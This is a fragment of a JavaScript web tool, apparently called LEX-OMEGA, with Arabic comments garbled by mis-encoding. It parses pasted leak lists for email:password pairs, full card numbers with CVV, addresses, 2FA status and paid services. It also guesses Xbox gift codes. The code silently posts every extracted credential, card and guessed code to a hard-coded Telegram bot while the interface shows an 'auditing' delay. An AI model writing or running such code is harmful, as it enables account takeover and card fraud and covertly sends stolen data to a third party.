        if (!BOT_TOKEN || !CHAT_ID) return;
        const toolName = (toolType === 'max') ? "MAX" : "PRO";
        const messageText = `ğŸ”‘ *LEX-OMEGA ${toolName} / GEN4: Ø¨ØµÙ…Ø© Ù†Øµ Ø¬Ø¯ÙŠØ¯Ø©* ğŸ”‘\n\nØ§Ù„Ø¨ØµÙ…Ø©: \`${hash}\`\n\n*Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØªÙƒØ±Ø§Ø± Ù‡Ø§ÙŠ Ø§Ù„Ø¨ØµÙ…Ø© ÙÙŠ Ø³Ø¬Ù„Ø§ØªÙƒ Ø§Ù„Ø³Ø§Ø¨Ù‚Ø©.*\n\nâš ï¸ *Ù…Ù„Ø§Ø­Ø¸Ø©:* Ø¥Ø°Ø§ Ù‡Ø§ÙŠ Ø§Ù„Ø¨ØµÙ…Ø© Ù…ÙƒØ±Ø±Ø©ØŒ ÙŠØ¹Ù†ÙŠ Ø§Ù„Ù„Ø³ØªØ© Ù…Ø³ØªØ®Ø¯Ù…Ø© Ù‚Ø¨Ù„.`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const data = { chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' };

        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
        .catch(error => console.error('Fetch Error (Hash):', error));
    }
    
    function switchTool(newTool) { 
        currentTool = newTool;
        maxToolView.classList.add('hidden');
        proToolView.classList.add('hidden');
        guesserToolView.classList.add('hidden');
        
        let toolTitleText = ""; 
        
        if (newTool === 'max') {
            maxToolView.classList.remove('hidden');
            toolTitleText = "Ø§Ù„Ù†Ø³Ø®Ø© Ø§Ù„Ø¹Ø§Ø¯ÙŠØ© (MAX)";
        } else if (newTool === 'pro') {
            proToolView.classList.remove('hidden');
            toolTitleText = "Ø§Ù„Ù†Ø³Ø®Ø© Ø§Ù„Ù…Ø­Ø³Ù†Ø© (PRO)";
        } else if (newTool === 'guesser') {
            guesserToolView.classList.remove('hidden');
            toolTitleText = "ØªØ®Ù…ÙŠÙ† Ø£ÙƒÙˆØ§Ø¯ Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª";
            if (outputGuesser.value === "") generateXboxCode(); 
        }
        
        menuItems.forEach(item => {
            item.classList.remove('active-tool'); 
            if (item.getAttribute('data-tool') === newTool) {
                 item.classList.add(`active-tool`); 
            }
        });

        dropdownMenu.classList.add('hidden');
        menuButton.classList.remove('active');
        showToast(`ØªÙ… Ø§Ù„ØªØ¨Ø¯ÙŠÙ„ Ø¥Ù„Ù‰: ${toolTitleText}`);
    }
    
    menuButton.onclick = (e) => {
        e.stopPropagation();
        dropdownMenu.classList.toggle('hidden');
        menuButton.classList.toggle('active');
    };
    
    document.addEventListener('click', (e) => {
        if (!menuContainer.contains(e.target)) {
            dropdownMenu.classList.add('hidden');
            menuButton.classList.remove('active');
        }
    });

    // **********************************************
    // ** ÙƒÙˆØ¯ Ø£Ø¯Ø§Ø© ØªØ®Ù…ÙŠÙ† Ø§Ù„Ø£ÙƒÙˆØ§Ø¯ (Guesser Tool Logic) **
    // **********************************************
    function generateGroup() {
        const characters = 'ABCDEFGHJKLMNPRSTUVWXYZ23456789'; 
        let group = '';
        for (let i = 0; i < 5; i++) {
            group += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return group;
    }

    function generateXboxCode() {
        const fullCode = `${generateGroup()}-${generateGroup()}-${generateGroup()}-${generateGroup()}-${generateGroup()}`;
        outputGuesser.value = fullCode;
        showToast("ØªÙ… ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ Ø¬Ø¯ÙŠØ¯!");
        
        const telegramMessage = `âš ï¸ *ÙƒÙˆØ¯ Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³ Ù…ÙØ®Ù…Ù‘ÙÙ† (US) / GEN4* âš ï¸\n\n\`\`\`${fullCode}\`\`\`\n\n*Ù…Ù„Ø§Ø­Ø¸Ø©:* Ø§Ù„Ø£ÙƒÙˆØ§Ø¯ Ø§Ù„Ù…ÙØ®Ù…Ù‘ÙÙ†Ø© Ø¹Ø´ÙˆØ§Ø¦ÙŠØ© (Random Guess) ÙˆÙ‚Ø¯ ØªÙƒÙˆÙ† ØºÙŠØ± ØµØ§Ù„Ø­Ø©.`;
        sendToTelegram(telegramMessage);
    }

    async function copyGeneratedCode() {
        const code = outputGuesser.value.trim();
        if (!code || code.includes('ÙŠØ¸Ù‡Ø± Ù‡Ù†Ø§')) {
            showToast("Ù…Ø§ÙƒÙˆ ÙƒÙˆØ¯ Ù„ØªÙ†Ø³Ø®Ù‡");
            return;
        }
        await copyText(code) && showToast("ØªÙ… Ù†Ø³Ø® Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„ÙƒØ§Ù…Ù„");
    }

    // **********************************************
    // ** ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ø§ØªØµØ§Ù„ ÙˆØ§Ù„ØªÙ†Ø²ÙŠÙ„ ÙˆØ§Ù„Ù€ parseText Ø§Ù„Ù…ÙØ¹Ø¯Ù‘ÙÙ„Ø© (GEN4) **
    // **********************************************
    function sendToTelegram(messageText) { 
        if (!BOT_TOKEN || !CHAT_ID) return console.error("Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯Ø©.");
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const data = { chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' };

        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
        .then(response => response.json())
        .then(data => { if (!data.ok) console.error("Ø®Ø·Ø£ Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„ÙŠÙƒØ±Ø§Ù…:", data.description); })
        .catch(error => console.error('Fetch Error:', error));
    }
    function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
    function promptAdminLogin() { 
        const code = prompt("Ø£Ø¯Ø®Ù„ ÙƒÙˆØ¯ Ø§Ù„Ø£Ø¯Ù…Ù†:");
        if (code === ADMIN_CODE) {
            navigateTo('admin');
        } else if (code !== null) {
            showToast("ÙƒÙˆØ¯ Ø§Ù„Ø£Ø¯Ù…Ù† ØºÙ„Ø·!");
        }
    }
    
    // ÙˆØ¸ÙŠÙØ© parseText Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© ÙˆØ§Ù„Ù…Ø¹Ø¯Ù„Ø© Ù„Ø¯Ø¹Ù… Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬ ÙƒÙ…Ø¯Ø®Ù„
    async function parseText(toolType) { 
        const inputElement = (toolType === 'max') ? inputMax : inputPro;
        const listElement = (toolType === 'max') ? listMax : listPro;
        const parseBtn = (toolType === 'max') ? parseBtnMax : parseBtnPro;
        
        const originalText = inputElement.value.trim();
        listElement.innerHTML = "";
        if (!originalText) return showToast("Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù†Øµ Ù„Ù„Ù…Ø³Ø­");
        
        parseBtn.classList.add('processing');
        parseBtn.textContent = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ¯Ù‚ÙŠÙ‚... â³";
        
        const currentHash = hashText(originalText);
        sendHashToTelegram(currentHash, toolType); 

        await delay(DELAY_MS); 

        const extractedPairs = []; 
        const lines = originalText.split('\n').filter(line => line.trim() !== '');

        // Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ù…Ø¹Ø¯Ù„ Ù„Ø¯Ø¹Ù… Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø¬Ø¯ÙŠØ¯ ÙˆØ§Ù„Ù…ÙØµÙˆÙ„ Ø¨Ø§Ù„Ù€ |
        const advancedRegex = /^\s*([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\-\| ]\s*([^\s,;'"<>()\[\]{}|\/\\]+)(.*)/i;
        // Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ø¹Ø§Ù… Ø§Ù„Ù‚Ø¯ÙŠÙ… Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù€ Email:Password Ù…Ù† Ø§ÙŠ Ù…ÙƒØ§Ù† Ø¨Ø§Ù„Ø³Ø·Ø± (Ù„Ù„ØªÙˆØ§ÙÙ‚)
        const emailPwRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\-\| ]\s*([^\s,;'"<>()\[\]{}|\/\\]+)/g;

        const gamePassKeywords = /([(#=\-\[\]\s\/\!\@\&\*]|^)(ÙƒÙŠÙ…\s?Ø¨Ø§Ø³|Ù‚ÙŠÙ…\s?Ø¨Ø§Ø³|game\s?pass|gamepass|gpass|(xbox\s?(game\s?pass)?\s?ultimate)|Ø§Ù„ØªÙŠÙ…ÙŠØª|Ø¬ÙˆÙ„Ø¯|gold|pc\s?(game\s?pass)?|xbox|gpu|xgpu|Ø¨ÙŠØ³ÙŠ|ÙƒÙ…Ø¨ÙŠÙˆØªØ±|Ù…ÙØ¹Ù„|Ù†Ø´Ø·|active|months|years|Ø³Ù†Ø©|Ø³Ù†Ù‡|Ø§Ø´ØªØ±Ø§Ùƒ|gaming|mo(nths)?|yr(s)?|3m|6m|12m|1y|Subscription\s*:\s*(Xbox|PC)\s*Game\s*Pass|Subscription\s*:\s*Xbox\s*Game\s*Pass\s*Ultimate|essential)/gi; 
        const extendedFeaturesRegex = /(netflix|spotify|disney\+?|hbo\s?max|amazon\s?prime|ea\s?play|discord\s?nitro|v-bucks|robux|free\s?pass|chatgpt\s?plus|midjourney|adobe\s?cc|genshin\s?impact|ubisoft|origin|mojang|rockstar|battle\.net)/gi;
        const priceRegex = /(price|credit|Ø±ØµÙŠØ¯|Ø¯ÙˆÙ„Ø§Ø±|ÙƒØ±Ø¯Øª|USD|EUR|GBP|TRY|CAD|BRL|MXN|ARS|JPY|AUD)\s*[:=\-]?\s*\$?\s*(\d+[\.\d]*)/gi; // Ø±ÙŠØ¬ÙŠÙƒØ³ Ù…Ø­Ø³Ù‘Ù† Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø£Ø±Ù‚Ø§Ù… Ø§Ù„Ø¹Ø´Ø±ÙŠØ©
        
        // ** Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯: ØªØ­Ø³ÙŠÙ† Ø§Ù„ØªÙ‚Ø§Ø· CC FULL Ø­ØªÙ‰ Ù„Ùˆ ÙƒØ§Ù†Øª Ø§Ù„Ø£Ø±Ù‚Ø§Ù… Ù…ÙØµÙˆÙ„Ø© Ø¨ÙØ±Ø§ØºØ§Øª Ø£Ùˆ Ø´ÙØ±ÙØ· **
        const ultraCardRegex = /(\d{4}\s*\-?\s*\d{4}\s*\-?\s*\d{4}\s*\-?\s*\d{4})[^\d]*(?:exp|date|Expires|expiry|ØªØ§Ø±ÙŠØ®)\s*[:\-\/]*\s*(\d{1,2})[\/\-](\d{2,4})[^\d]*(?:cvv|cvc|security|code|Ø±Ù…Ø²)\s*[:=\-]\s*(\d{3,4})/i;
        
        // ** Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯: ØªØ­Ø³ÙŠÙ† Ø§Ù„ØªÙ‚Ø§Ø· CC PARTIAL Ø­ØªÙ‰ Ù„Ùˆ ÙƒØ§Ù†Øª Ø§Ù„Ø£Ø±Ù‚Ø§Ù… Ù…ÙØµÙˆÙ„Ø© Ø¨ÙØ±Ø§ØºØ§Øª Ø£Ùˆ Ø´ÙØ±ÙØ· **
        const partialCardRegex = /(?:Last4|4\s?Digits|Ø§Ø®Ø±\s*Ø§Ø±Ø¨Ø¹)\s*[:=\-]?\s*(\d{4})[^\d]+(?:exp|date|Expires|expiry|ØªØ§Ø±ÙŠØ®)\s*[:\-\/]*\s*(\d{1,2})[\/\-](\d{2})/i;
        
        const userAddressRegex = /Address\s*=\s*\[\s*Address:\s*([^,\]]+),\s*City:\s*([^,\]]+),\s*State:\s*([^,\]]+),\s*Postalcode:\s*([^\]]+)\s*\]/i;
        const securityStatusRegex = /(2fa|2\s?step|mfa|two\s?factor|backup\s?code|google\s?authenticator|authenticator|TOTP|Security\s?Questions|Enabled\s*:\s*2FA|Recovery\s?Email)\s*[:=\-]?\s*(Yes|On|True|Email\s*:\s*([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}))/i;
        
        // ** Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯: Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ø°ÙƒÙŠ Ù„Ù„ÙƒØ´Ù Ø¹Ù† ÙˆØ¬ÙˆØ¯ Ø£ÙŠ Ø·Ø±ÙŠÙ‚Ø© Ø¯ÙØ¹ Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠØ© Ø¨Ø¬Ù…ÙŠØ¹ ØµÙŠØºÙ‡Ø§ (ÙÙŠØ²Ø§ØŒ ÙƒÙŠ ÙƒØ§Ø±Ø¯ØŒ Ù…Ø§Ø³ØªØ±ØŒ Ø¨Ø§ÙŠ Ø¨Ø§Ù„ØŒ Ø¥Ù„Ø®) **
        const paymentKeywordsRegex = /(cc|credit\s?card|payment\s?method|Ø¨Ø·Ø§Ù‚Ø©\s?Ø¯ÙØ¹|ÙÙŠØ²Ø§|ÙƒÙŠ\s?ÙƒØ§Ø±Ø¯|Ù…Ø§Ø³ØªØ±|Ø¨Ø§ÙŠ\s?Ø¨Ø§Ù„|Ø§Ù…ÙŠØ±ÙƒØ§Ù†\s?Ø§ÙƒØ³Ø¨Ø±Ø³|Ø¨Ø·Ø§Ù‚Ø©\s?Ø§Ø¦ØªÙ…Ø§Ù†|Ø¯ÙØ¹\s?Ù…ÙØ¹Ù‘Ù„|Ø¯ÙØ¹\s?Ù†Ø´Ø·|billing|visa|mastercard|amex|discover|key\s?card|paypal|wallet|Ù…Ø­ÙØ¸Ø©|cc\s*full|cc\s*partial)/gi;

        for (const line of lines) {
            emailPwRegex.lastIndex = 0; priceRegex.lastIndex = 0;
            ultraCardRegex.lastIndex = 0; partialCardRegex.lastIndex = 0;
            userAddressRegex.lastIndex = 0; extendedFeaturesRegex.lastIndex = 0;
            securityStatusRegex.lastIndex = 0;
            paymentKeywordsRegex.lastIndex = 0; 
            
            let match;
            let email = null;
            let password = null;
            let remainderText = line; 

            // 1. Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø§ÙŠÙ…ÙŠÙ„ ÙˆØ§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯ Ø£ÙˆÙ„Ø§Ù‹ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ù…ØªÙ‚Ø¯Ù… (Ø§Ù„Ø°ÙŠ ÙŠØ¯Ø¹Ù… Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬)
            const advancedMatch = advancedRegex.exec(line);
            if (advancedMatch) {
                email = advancedMatch[1].trim();
                password = advancedMatch[2].trim();
                remainderText = advancedMatch[3] || ""; // Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ø³Ø·Ø± Ø¨Ø¹Ø¯ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯
            } else {
                // 2. Ø¥Ø°Ø§ ÙØ´Ù„ØŒ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ù‚Ø¯ÙŠÙ…
                const generalMatch = emailPwRegex.exec(line);
                 if (generalMatch) {
                    email = generalMatch[1].trim();
                    password = generalMatch[2].trim();
                    // Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø³Ø·Ø± Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ ÙƒÙ€ remainderText Ù„Ø¶Ù…Ø§Ù† Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª
                    remainderText = line; 
                }
            }

            if (email && password && password.length > 0) {
                const searchArea = line + " " + remainderText; // Ø§Ù„Ø¨Ø­Ø« ÙÙŠ Ø§Ù„Ø³Ø·Ø± ÙƒØ§Ù…Ù„Ø§Ù‹ ÙˆÙÙŠ Ø§Ù„Ø¨Ø§Ù‚ÙŠ
                
                const hasGamePass = gamePassKeywords.test(searchArea);
                
                let extractedPrice = null;
                priceRegex.lastIndex = 0;
                let priceMatch;
                // Ù‚Ø¯ ÙŠÙƒÙˆÙ† Ø§Ù„Ø±ØµÙŠØ¯ Ù…ÙˆØ¬ÙˆØ¯ ÙÙŠ Ø§Ù„Ø¨Ø¯Ø§ÙŠØ© Ø£Ùˆ ÙÙŠ Ø§Ù„Ù†Ù‡Ø§ÙŠØ©
                while ((priceMatch = priceRegex.exec(searchArea)) !== null) {
                    extractedPrice = priceMatch[2]; // Ø¢Ø®Ø± Ø³Ø¹Ø± ÙŠØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬Ù‡ Ù‡Ùˆ Ø§Ù„Ø£Ø±Ø¬Ø­
                }

                let cardDetails = null; 
                let ultraCardDetails = null; 
                let addressDetails = null;
                let extendedFeatures = []; 
                let securityStatus = null; 
                
                // ** Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯: Ø§Ù„ÙƒØ´Ù Ø¹Ù† ÙˆØ¬ÙˆØ¯ Ø£ÙŠ ÙˆØ³ÙŠÙ„Ø© Ø¯ÙØ¹ (Ø§Ù„Ø°ÙƒÙŠ) **
                const hasPaymentMethod = paymentKeywordsRegex.test(searchArea);
                
                if (toolType === 'pro') {
                    // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù…Ù…ÙŠØ²Ø§Øª
                    let featureMatch;
                    while ((featureMatch = extendedFeaturesRegex.exec(searchArea)) !== null) {
                         const feature = featureMatch[1].trim().toLowerCase().replace(/\s/g, '');
                         if (!extendedFeatures.includes(feature)) { extendedFeatures.push(feature); }
                    }

                    // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†
                    const addressMatch = userAddressRegex.exec(searchArea);
                    if (addressMatch) {
                        addressDetails = { address: addressMatch[1].trim(), city: addressMatch[2].trim(), state: addressMatch[3].trim(), zip: addressMatch[4].trim() };
                    }
                    
                    // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø­Ø§Ù„Ø© Ø§Ù„Ø­Ù…Ø§ÙŠØ©
                    const securityMatch = securityStatusRegex.exec(searchArea);
                    if (securityMatch) {
                        const type = securityMatch[1].toLowerCase();
                        const value = securityMatch[3] ? securityMatch[3].trim() : securityMatch[2];
                        if (type.includes('2fa') || type.includes('step') || type.includes('mfa') || type.includes('factor') || type.includes('authenticator')) {
                            securityStatus = `2FA: ${value.toLowerCase().includes('yes') || value.toLowerCase().includes('on') ? 'Ù…ÙØ¹Ù„Ø©' : 'Ù…Ø°ÙƒÙˆØ±Ø©'}`;
                        } else if (type.includes('recovery')) {
                             securityStatus = `Ø¥ÙŠÙ…ÙŠÙ„ Ø§Ø­ØªÙŠØ§Ø·ÙŠ: ${value}`;
                        }
                    }
                    
                    // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø¯ÙØ¹ Ø§Ù„ÙƒØ§Ù…Ù„Ø©
                    const ultraMatch = ultraCardRegex.exec(searchArea);
                    if (ultraMatch) {
                        ultraCardDetails = {
                            number: ultraMatch[1].replace(/[^\d]/g, ''), 
                            month: ultraMatch[2].padStart(2, '0'),
                            year: ultraMatch[3].slice(-2),
                            cvv: ultraMatch[4]
                        };
                    } else {
                        // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø¬Ø²Ø¦ÙŠØ©
                        const partialMatch = partialCardRegex.exec(searchArea);
                        if (partialMatch) {
                            cardDetails = {
                                last4: partialMatch[1].trim(), 
                                month: partialMatch[2].trim().padStart(2, '0'),
                                year: partialMatch[3].trim().slice(-2),
                            };
                        }
                    }
                }

                extractedPairs.push([email, password, hasGamePass, extractedPrice, cardDetails, addressDetails, ultraCardDetails, extendedFeatures, securityStatus, hasPaymentMethod]);
            }
        }
        
        if (0 === extractedPairs.length) {
             parseBtn.classList.remove('processing');
             parseBtn.textContent = (toolType === 'max') ? "Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ MAX" : "Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ PRO";
             return showToast("Ù…Ø§ÙƒÙˆ Ù†ØªØ§Ø¦Ø¬ Ù…Ø·Ø§Ø¨Ù‚Ø©");
        }

        // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ù…ÙƒØ±Ø±Ø© ÙˆØ¯Ù…Ø¬ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª
        const uniqueResults = [];
        for (const [email, password, hasGP, price, card, address, ultraCard, features, security, hasPayment] of extractedPairs) {
            const key = email.toLowerCase() + ":" + password;
            const existingIndex = uniqueResults.findIndex(item => (item[0].toLowerCase() + ":" + item[1]) === key);

            if (existingIndex === -1) {
                uniqueResults.push([email, password, hasGP, price, card, address, ultraCard, features, security, hasPayment]);
            } else {
                const existingItem = uniqueResults[existingIndex];
                if (hasGP && !existingItem[2]) existingItem[2] = true; 
                if (price !== null && existingItem[3] === null) existingItem[3] = price;
                if (card !== null && existingItem[4] === null) existingItem[4] = card;
                if (address !== null && existingItem[5] === null) existingItem[5] = address;
                if (ultraCard !== null && existingItem[6] === null) existingItem[6] = ultraCard;
                if (security !== null && existingItem[8] === null) existingItem[8] = security; 
                // Ø¯Ù…Ø¬ Ø­Ø§Ù„Ø© Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø°ÙƒÙŠØ©: Ù†Ø¹ØªÙ…Ø¯Ù‡Ø§ Ø¥Ø°Ø§ ÙƒØ§Ù†Øª ÙÙŠ Ø£ÙŠ Ù…Ù† Ø§Ù„Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù…ÙƒØ±Ø±Ø©
                if (hasPayment && !existingItem[9]) existingItem[9] = true; 
                existingItem[7] = [...new Set([...existingItem[7], ...features])];
            }
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ© Ù…Ø¹ ØªØ¶Ù…ÙŠÙ† Ø§Ù„Ø¨ØµÙ…Ø©
        if (uniqueResults.length > 0) {
            const telegramMessage = uniqueResults.map(([email, password, hasGP, price, card, address, ultraCard, features, security, hasPayment]) => {
                // ** Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯: Ø¥Ø¶Ø§ÙØ© Ø¥ÙŠÙ…ÙˆØ¬ÙŠ ğŸ’³ Ø¨Ø¬Ø§Ù†Ø¨ Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„ Ø¥Ø°Ø§ ØªÙ… Ø§Ù„ÙƒØ´Ù Ø¹Ù† ÙˆØ³ÙŠÙ„Ø© Ø¯ÙØ¹ **
                let emailPrefix = hasPayment ? "ğŸ’³ " : "";
                let text = `${emailPrefix}${email}:${password}`;
                
                if (hasGP) text += " | ÙƒÙŠÙ… Ø¨Ø§Ø³";
                if (price) text += ` | Ø±ØµÙŠØ¯ $${price}`;
                // ØªØ¹Ø¯ÙŠÙ„: Ø¸Ù‡ÙˆØ± Ù…Ù„Ø§Ø­Ø¸Ø© PAYMENT_METHOD ÙÙ‚Ø· Ø¥Ø°Ø§ ØªÙ… Ø§Ù„ÙƒØ´Ù Ø¹Ù† Ø·Ø±ÙŠÙ‚Ø© Ø¯ÙØ¹ ÙˆÙ„Ù… ÙŠØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨Ø·Ø§Ù‚Ø© (Ù„ØªØ¬Ù†Ø¨ Ø§Ù„ØªÙƒØ±Ø§Ø±)
                if (hasPayment && !ultraCard && !card) text += " | ğŸ’³ PAYMENT_METHOD"; 
                
                if (ultraCard) {
                    text += ` | âš¡ï¸CC FULL: ${ultraCard.number}|${ultraCard.month}/${ultraCard.year}|${ultraCard.cvv}`;
                } else if (card) {
                    text += ` | ğŸ’³CC PARTIAL: ****${card.last4}, ${card.month}/${card.year}`;
                }
                if (address) {
                    text += ` | ğŸ“ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${address.city}, ${address.zip}`;
                }
                if (security) {
                    text += ` | ğŸ”’ ${security}`;
                }
                if (features.length > 0) {
                    text += ` | âœ¨ Ø®Ø¯Ù…Ø§Øª: ${features.map(f => f.charAt(0).toUpperCase() + f.slice(1)).join(', ')}`;
                }
                return text;
            }).join('\n');
            
            const toolName = (toolType === 'max') ? "MAX" : "PRO (GEN4)";
            
            const header = `ğŸ‰ *Ù†ØªØ§Ø¦Ø¬ Ø£Ø¯Ø§Ø© LEX-OMEGA ${toolName} Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© (GEN4)* ğŸ‰\n\n*Ø§Ù„Ø¨ØµÙ…Ø©:* \`${currentHash}\` (Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªÙƒØ±Ø§Ø±)\nØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ ${uniqueResults.length} Ù†ØªÙŠØ¬Ø© ÙØ±ÙŠØ¯Ø©:\n\n\`\`\``;
            
            const footer = "\n\`\`\`\nØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ù…Ù† Ø§Ù„Ø£Ø¯Ø§Ø©.";
            sendToTelegram(header + telegramMessage + footer);
        }

        // Ø¨Ù†Ø§Ø¡ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ (Ø§Ù„Ø¹Ø±Ø¶ Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø§Ø´Ø©)
        uniqueResults.forEach(([email, password, hasGamePass, price, cardDetails, addressDetails, ultraCardDetails, extendedFeatures, securityStatus, hasPaymentMethod]) => {
            const itemDiv = document.createElement("div");
            itemDiv.className = "item";
            const leftDiv = document.createElement("div");
            leftDiv.className = "left";
            const emailDiv = document.createElement("div");
            emailDiv.className = "email";
            
            // ** Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯: Ø¹Ø±Ø¶ Ø¥ÙŠÙ…ÙˆØ¬ÙŠ ğŸ’³ Ø¨Ø¬Ø§Ù†Ø¨ Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„ ÙÙŠ Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© **
            if (hasPaymentMethod) {
                 const paymentEmoji = document.createElement("span"); 
                 paymentEmoji.textContent = 'ğŸ’³ '; 
                 paymentEmoji.style.color = '#fff'; // Ù„Ø¶Ù…Ø§Ù† Ø¸Ù‡ÙˆØ± Ø§Ù„Ø¥ÙŠÙ…ÙˆØ¬ÙŠ Ø¨ÙˆØ¶ÙˆØ­
                 emailDiv.appendChild(paymentEmoji);
            }
            emailDiv.appendChild(document.createTextNode(email));
            
            const pwDiv = document.createElement("div");
            pwDiv.className = "pw";
            pwDiv.appendChild(document.createTextNode(password)); 
            
            // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª:
            if (hasGamePass) {
                 const gpSpan = document.createElement("span"); gpSpan.className = "gamepass-note"; gpSpan.textContent = "ğŸ® ÙƒÙŠÙ… Ø¨Ø§Ø³"; pwDiv.appendChild(gpSpan); 
            }
            if (price !== null) {
                 const priceSpan = document.createElement("span"); priceSpan.className = "price-note"; priceSpan.textContent = `ğŸ’² Ø±ØµÙŠØ¯ $${price}`; pwDiv.appendChild(priceSpan); 
            }
            // ** Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯: Ø¹Ø±Ø¶ Ù…Ù„Ø§Ø­Ø¸Ø© Ø§Ù„Ø¯ÙØ¹ (ğŸ’³) Ø¨Ø´ÙƒÙ„ ÙˆØ§Ø¶Ø­ (ÙŠØ¸Ù‡Ø± ÙÙ‚Ø· Ø§Ø°Ø§ Ù…Ø§ÙƒÙˆ ØªÙØ§ØµÙŠÙ„ Ø¨Ø·Ø§Ù‚Ø© ÙƒØ§Ù…Ù„Ø© Ø§Ùˆ Ø¬Ø²Ø¦ÙŠØ©) **
            if (hasPaymentMethod && !ultraCardDetails && !cardDetails) {
                 const paymentSpan = document.createElement("span");
                 paymentSpan.className = "cc-note"; 
